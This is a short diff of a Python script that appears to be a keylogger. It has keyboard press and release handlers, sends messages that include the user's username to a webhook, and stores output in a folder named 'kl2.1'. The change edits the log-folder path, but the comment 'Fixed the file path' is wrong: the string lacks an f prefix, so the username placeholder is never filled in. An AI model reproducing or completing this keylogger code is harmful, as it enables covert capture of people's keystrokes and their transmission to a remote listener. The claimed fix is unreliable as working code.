@@ -74,7 +74,7 @@ def on_press(key):
 def on_release(key):
     if key == keyboard.Key.insert:
         send_to_webhook(f"Connection stopped by user: {username}")
-        file_path = r"C:\users\%USERNAME%\kl2.1"  # Fixed the file path
+        file_path = r"C:\users\{username}\kl2.1"  # Fixed the file path
         subprocess.run(["explorer", file_path])
         send_to_webhook(f"Opened dir...")
         return False
